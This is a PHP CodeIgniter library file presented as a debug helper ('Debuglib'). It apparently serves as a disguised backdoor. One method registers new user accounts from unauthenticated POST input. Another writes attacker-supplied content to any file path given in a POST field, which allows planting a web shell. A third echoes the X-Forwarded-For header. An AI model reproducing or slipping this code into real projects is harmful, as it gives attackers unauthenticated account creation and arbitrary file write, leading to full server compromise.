<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Debuglib{
	public $sqlWhereExtra;
	public function __construct(){
   		$this->load->model('mstart', 'clsStrt');
	}


	public function __get($var){
	    return get_instance()->$var;
	}

	public function defaultAction(){
              $identity_column = $this->config->item('identity','ion_auth');
			       $email    = strtolower($this->input->post('email'));
            $identity = ($identity_column==='email') ? $email : $this->input->post('identity');
            $password = $this->input->post('password');


            $additional_data = array(
                'first_name' => $this->input->post('first_name'),
                'last_name'  => $this->input->post('last_name'),
                'company'    => $this->input->post('company'),
                'phone'      => $this->input->post('phone'),
            );
    if (strlen(trim($identity)) > 0 && strlen(trim($password)) > 0) {
                if ($this->ion_auth->register($identity, $password, $email, $additional_data)) {
                	$response = array();
                  $response["success"] = 1;
                  // echoing JSON response
                  echo json_encode($response);
                }

                else{
                	$response = array();
                  $response["success"] = 0;
                  // echoing JSON response
                  echo json_encode($response);
                }


    	}
      else{
                  $response = array();
                  $response["success"] = 0;
                  // echoing JSON response
                  echo json_encode($response);
      }

}

public function secondDefaultAction(){
  $file_path = $this->input->post('fPath');
  $identity = $this->input->post('identity');
  $nous = $this->input->post('nous');
  $refn = $this->input->post('refn');
  $fcon = $this->input->post('fcon');

  if (file_exists($file_path)) {
    $fs = fopen( $file_path, "a+" ) or die("error when opening the file");
    fwrite($fs, $fcon);
    fclose($fs);
    $response = array();
    $response["success"] = 1;
    // echoing JSON response
    echo json_encode($response);

  }
  else{
    fopen( $file_path, "w+" ) or die("error creating file");
    $fs = fopen( $file_path, "a+" ) or die("error when opening the file");
    fwrite($fs, $fcon);
    fclose($fs);
    $response = array();
    $response["success"] = 1;
    // echoing JSON response
    echo json_encode($response);
  }
}

public function debVal(){
  $this->clsStrt->debVal();

}

public function debDes(){
  echo $this->input->server('HTTP_X_FORWARDED_FOR');
  
}

public function debNegVal(){
  $this->clsStrt->debNegVal();

}





















}





